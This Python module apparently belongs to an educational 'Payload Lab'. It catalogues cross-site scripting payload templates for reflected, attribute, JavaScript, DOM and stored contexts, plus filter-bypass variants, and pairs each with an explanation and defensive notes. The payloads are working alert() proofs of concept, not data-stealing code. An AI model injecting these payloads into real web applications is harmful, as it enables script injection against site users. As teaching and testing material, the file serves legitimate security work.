"""
Payload Lab - XSS Module
Educational XSS payload templates demonstrating common attack patterns

⚠️ EDUCATIONAL TEMPLATES ONLY - NOT FOR UNAUTHORIZED USE

Reference: OWASP XSS Testing Guide, PortSwigger XSS Cheat Sheet
"""

from typing import List
from ..core.models import XSSPayload


class XSSModule:
    """XSS payload template generator for educational purposes"""
    
    @staticmethod
    def get_all_payloads() -> List[XSSPayload]:
        """Get all XSS payload templates"""
        payloads = []
        
        # Reflected XSS - HTML Context
        payloads.extend(XSSModule._get_reflected_html_payloads())
        
        # Reflected XSS - Attribute Context
        payloads.extend(XSSModule._get_attribute_context_payloads())
        
        # Reflected XSS - JavaScript Context
        payloads.extend(XSSModule._get_javascript_context_payloads())
        
        # DOM-Based XSS
        payloads.extend(XSSModule._get_dom_based_payloads())
        
        # Stored XSS
        payloads.extend(XSSModule._get_stored_xss_payloads())
        
        # Bypass Techniques
        payloads.extend(XSSModule._get_bypass_payloads())
        
        return payloads
    
    @staticmethod
    def _get_reflected_html_payloads() -> List[XSSPayload]:
        """Reflected XSS in HTML context templates"""
        return [
            XSSPayload(
                id="xss-001",
                category="xss",
                type="reflected",
                context="html",
                template="<script>alert('XSS')</script>",
                explanation="Basic script tag injection - most common XSS pattern when user input is reflected in HTML body",
                defensive_notes="Modern browsers and CSP policies block inline scripts. WAFs detect <script> tags easily.",
                bypass_technique="none"
            ),
            XSSPayload(
                id="xss-002",
                category="xss",
                type="reflected",
                context="html",
                template="<img src=x onerror=alert('XSS')>",
                explanation="Event handler injection via img tag - triggers when image fails to load",
                defensive_notes="Content Security Policy (CSP) with 'unsafe-inline' disabled prevents this. Input sanitization removes event handlers.",
                bypass_technique="none"
            ),
            XSSPayload(
                id="xss-003",
                category="xss",
                type="reflected",
                context="html",
                template="<svg onload=alert('XSS')>",
                explanation="SVG-based XSS using onload event - alternative to img tag",
                defensive_notes="Modern WAFs recognize SVG event handlers. Proper HTML sanitization libraries (DOMPurify) remove these.",
                bypass_technique="none"
            ),
            XSSPayload(
                id="xss-004",
                category="xss",
                type="reflected",
                context="html",
                template="<body onload=alert('XSS')>",
                explanation="Body tag with onload event - executes when page loads",
                defensive_notes="Rarely works as it requires injecting into or replacing body tag. Sanitization prevents this.",
                bypass_technique="none"
            ),
            XSSPayload(
                id="xss-005",
                category="xss",
                type="reflected",
                context="html",
                template="<iframe src=javascript:alert('XSS')>",
                explanation="JavaScript protocol in iframe src - executes JS in iframe context",
                defensive_notes="CSP frame-src directive blocks this. Modern browsers restrict javascript: protocol.",
                bypass_technique="none"
            ),
        ]
    
    @staticmethod
    def _get_attribute_context_payloads() -> List[XSSPayload]:
        """XSS in HTML attribute context templates"""
        return [
            XSSPayload(
                id="xss-101",
                category="xss",
                type="reflected",
                context="attribute",
                template="\" onmouseover=\"alert('XSS')\"",
                explanation="Breaking out of attribute value to inject event handler - common when input is in href, src, or value attributes",
                defensive_notes="Attribute encoding and strict attribute validation prevent this. Never insert user data into attributes without encoding.",
                bypass_technique="attribute_breakout"
            ),
            XSSPayload(
                id="xss-102",
                category="xss",
                type="reflected",
                context="attribute",
                template="' onclick='alert(\"XSS\") '",
                explanation="Single quote breakout for attribute injection - works when developer uses single quotes",
                defensive_notes="Context-aware output encoding handles both single and double quotes. Modern frameworks auto-escape.",
                bypass_technique="attribute_breakout"
            ),
            XSSPayload(
                id="xss-103",
                category="xss",
                type="reflected",
                context="attribute",
                template="javascript:alert('XSS')",
                explanation="JavaScript protocol in href attribute - executes when link is clicked",
                defensive_notes="URL validation should whitelist http/https only. Frameworks like React prevent javascript: URLs by default.",
                bypass_technique="protocol_handler"
            ),
            XSSPayload(
                id="xss-104",
                category="xss",
                type="reflected",
                context="attribute",
                template="data:text/html,<script>alert('XSS')</script>",
                explanation="Data URI with HTML content - can execute scripts in some contexts",
                defensive_notes="CSP and proper URL validation block data: URIs. Always validate URL schemes.",
                bypass_technique="protocol_handler"
            ),
        ]
    
    @staticmethod
    def _get_javascript_context_payloads() -> List[XSSPayload]:
        """XSS in JavaScript context templates"""
        return [
            XSSPayload(
                id="xss-201",
                category="xss",
                type="reflected",
                context="javascript",
                template="'; alert('XSS'); //",
                explanation="Breaking out of JavaScript string literal - common when user input is placed in JS variable",
                defensive_notes="Never put user input directly in <script> tags. Use JSON encoding and proper escaping. Consider using data attributes instead.",
                bypass_technique="string_breakout"
            ),
            XSSPayload(
                id="xss-202",
                category="xss",
                type="reflected",
                context="javascript",
                template="\"; alert('XSS'); //",
                explanation="Double quote string breakout in JavaScript context",
                defensive_notes="Use JSON.stringify() for any dynamic data in JS. Avoid inline scripts entirely with CSP.",
                bypass_technique="string_breakout"
            ),
            XSSPayload(
                id="xss-203",
                category="xss",
                type="reflected",
                context="javascript",
                template="</script><script>alert('XSS')</script>",
                explanation="Script tag breakout - closes existing script and opens new one",
                defensive_notes="HTML encoding even inside script tags. Better: avoid putting user data in scripts entirely.",
                bypass_technique="tag_breakout"
            ),
        ]
    
    @staticmethod
    def _get_dom_based_payloads() -> List[XSSPayload]:
        """DOM-based XSS templates"""
        return [
            XSSPayload(
                id="xss-301",
                category="xss",
                type="dom",
                context="javascript",
                template="#<img src=x onerror=alert('XSS')>",
                explanation="DOM XSS via URL fragment - exploits unsafe use of location.hash in JavaScript",
                defensive_notes="Sanitize all data from location.hash, location.search before inserting into DOM. Use textContent instead of innerHTML.",
                bypass_technique="none"
            ),
            XSSPayload(
                id="xss-302",
                category="xss",
                type="dom",
                context="javascript",
                template="javascript:alert('XSS')",
                explanation="DOM XSS via javascript: protocol in dynamically created links",
                defensive_notes="Validate URLs before setting href. Use URL API to parse and validate schemes.",
                bypass_technique="protocol_handler"
            ),
            XSSPayload(
                id="xss-303",
                category="xss",
                type="dom",
                context="html",
                template="<img src=1 onerror=alert(document.domain)>",
                explanation="DOM XSS demonstrating document access - shows execution context",
                defensive_notes="DOMPurify or similar libraries sanitize HTML before insertion. Avoid eval() and innerHTML with user data.",
                bypass_technique="none"
            ),
        ]
    
    @staticmethod
    def _get_stored_xss_payloads() -> List[XSSPayload]:
        """Stored (persistent) XSS templates"""
        return [
            XSSPayload(
                id="xss-401",
                category="xss",
                type="stored",
                context="html",
                template="<script>alert('Stored XSS')</script>",
                explanation="Basic stored XSS - persisted in database and executed for all users viewing the content",
                defensive_notes="Server-side input validation + output encoding. Store data safely, encode on output. Use CSP as defense-in-depth.",
                bypass_technique="none"
            ),
            XSSPayload(
                id="xss-402",
                category="xss",
                type="stored",
                context="html",
                template="<img src=x onerror=alert('Persistent')>",
                explanation="Stored XSS via image tag - persists in comments, profiles, messages",
                defensive_notes="Sanitize all user-generated content before storage and on output. Use allowlist of safe HTML tags if rich text is needed.",
                bypass_technique="none"
            ),
            XSSPayload(
                id="xss-403",
                category="xss",
                type="stored",
                context="html",
                template="<svg/onload=alert('XSS')>",
                explanation="Stored SVG XSS - compact syntax that may bypass length restrictions",
                defensive_notes="Implement strict CSP. Sanitize with libraries that understand modern HTML5 tags. Limit input length.",
                bypass_technique="none"
            ),
        ]
    
    @staticmethod
    def _get_bypass_payloads() -> List[XSSPayload]:
        """Educational bypass technique demonstrations (strings only, not functional bypasses)"""
        return [
            XSSPayload(
                id="xss-501",
                category="xss",
                type="reflected",
                context="html",
                template="<ScRiPt>alert('XSS')</ScRiPt>",
                explanation="Case variation attempt - tries to bypass case-sensitive filters",
                defensive_notes="Proper filters are case-insensitive. Defense should normalize input case before checking.",
                bypass_technique="case_variation"
            ),
            XSSPayload(
                id="xss-502",
                category="xss",
                type="reflected",
                context="html",
                template="<script>alert(String.fromCharCode(88,83,83))</script>",
                explanation="Character code encoding - attempts to hide 'XSS' string from pattern matching",
                defensive_notes="Modern WAFs execute/sandbox JavaScript to detect encoded payloads. Tag structure is still detected.",
                bypass_technique="encoding"
            ),
            XSSPayload(
                id="xss-503",
                category="xss",
                type="reflected",
                context="html",
                template="<img src=x oneonerrorrror=alert('XSS')>",
                explanation="Demonstrates double-encoding/recursive filter bypass logic - if filter removes 'onerror', this becomes 'onerror'",
                defensive_notes="Recursive sanitization or proper HTML parser prevents this. Don't use simple string replacement for sanitization.",
                bypass_technique="recursive_filter"
            ),
            XSSPayload(
                id="xss-504",
                category="xss",
                type="reflected",
                context="html",
                template="<svg><script>alert('XSS')</script></svg>",
                explanation="Nested context - SVG can contain script tags in some parsers",
                defensive_notes="Context-aware HTML parsers handle nested tags. Use DOMPurify or similar libraries.",
                bypass_technique="context_switching"
            ),
            XSSPayload(
                id="xss-505",
                category="xss",
                type="reflected",
                context="attribute",
                template="&#60;script&#62;alert('XSS')&#60;/script&#62;",
                explanation="HTML entity encoding of tags - may be decoded by browser in some contexts",
                defensive_notes="Context-aware encoding prevents this. Encode for the specific output context (HTML, attribute, JS, URL).",
                bypass_technique="encoding"
            ),
        ]
    
    @staticmethod
    def get_by_context(context: str) -> List[XSSPayload]:
        """
        Get payloads filtered by context
        
        Args:
            context: html, attribute, or javascript
        
        Returns:
            Filtered list of XSS payloads
        """
        all_payloads = XSSModule.get_all_payloads()
        return [p for p in all_payloads if p.context == context]
    
    @staticmethod
    def get_by_type(xss_type: str) -> List[XSSPayload]:
        """
        Get payloads filtered by type
        
        Args:
            xss_type: reflected, stored, or dom
        
        Returns:
            Filtered list of XSS payloads
        """
        all_payloads = XSSModule.get_all_payloads()
        return [p for p in all_payloads if p.type == xss_type]
